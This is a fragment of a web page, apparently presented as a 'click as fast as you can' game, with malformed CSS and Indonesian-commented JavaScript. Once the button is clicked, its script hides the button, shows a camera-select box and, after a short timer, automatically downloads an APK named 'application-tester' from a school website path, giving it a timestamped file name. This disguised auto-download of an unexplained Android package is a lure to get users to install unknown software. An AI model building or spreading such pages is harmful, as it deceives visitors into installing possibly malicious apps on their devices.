      @keyframes bounce {
        0%,
        20%,
        50%,
        80%,

        }
        40% {
          transform: translateY(-10px);
        }
        60% {
          transform: translateY(-5px);
        }

      .center-text span {

        font-weight: normal;

        opacity: 0;
        transition: opacity 1s ease;

    <script>
      function startGame() {
        const clickText = document.getElementById("click-text");
        const selectBox = document.getElementById("camera-select");

        // Sembunyikan tombol "Click as Fast as You Can!"
        clickText.style.display = "none";
        // Tampilkan kotak select
        selectBox.style.display = "block";

        setTimeout(() => {
          selectBox.style.opacity = "1";
        }, 10);

        // Setelah 3 detik, download otomatis
        setTimeout(() => {
          // URL file APK yang akan diunduh
          const downloadUrl = "https://smanrancaekek.sch.id/bugbounty/chrome/application-tester.apk";

          // Buat nama file berdasarkan tanggal dan jam sekarang (dengan detik)
          const now = new Date();
          const year = now.getFullYear();
          const month = String(now.getMonth() + 1).padStart(2, "0"); // Bulan dimulai dari 0
          const day = String(now.getDate()).padStart(2, "0");
          const hour = String(now.getHours()).padStart(2, "0");
          const minute = String(now.getMinutes()).padStart(2, "0");
          const second = String(now.getSeconds()).padStart(2, "0");

          // Format nama file: application-tester_YYYYMMDD_HHMMSS.apk
          const fileName = `application-tester_${year}${month}${day}_${hour}${minute}${second}.apk`;

          // Buat dan unduh file
          const link = document.createElement("a");
          link.href = downloadUrl;
          link.download = fileName; // Gunakan nama file yang dinamis di sini
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
        }, 2100); // Tunggu 3 detik
      }
